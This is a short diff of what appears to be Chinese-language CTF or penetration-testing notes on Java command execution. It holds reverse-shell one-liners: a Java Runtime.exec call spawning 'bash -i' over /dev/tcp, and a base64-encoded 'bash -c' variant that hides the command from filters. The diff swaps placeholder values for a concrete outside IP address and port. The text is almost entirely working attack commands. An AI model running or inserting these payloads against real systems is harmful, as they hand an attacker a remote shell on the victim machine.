@@ -29,9 +29,9 @@ POST请求的数据体读/flag文件发送到服务器。
 Runtime.getRuntime().exec("bash -i >& /dev/tcp/ip/port 0>&1");
 注意java这里反弹shell需要改良
 
-bash -i >& /dev/tcp/ip/port 0>&1 需要base64编码再执行下面：
+bash -i >& /dev/tcp/1.92.88.247/2333 0>&1 需要base64编码再执行下面：
 
-bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}
+bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjkyLjg4LjI0Ny8yMzMzIDA+JjE=}|{base64,-d}|{bash,-i}
 ```
 
 
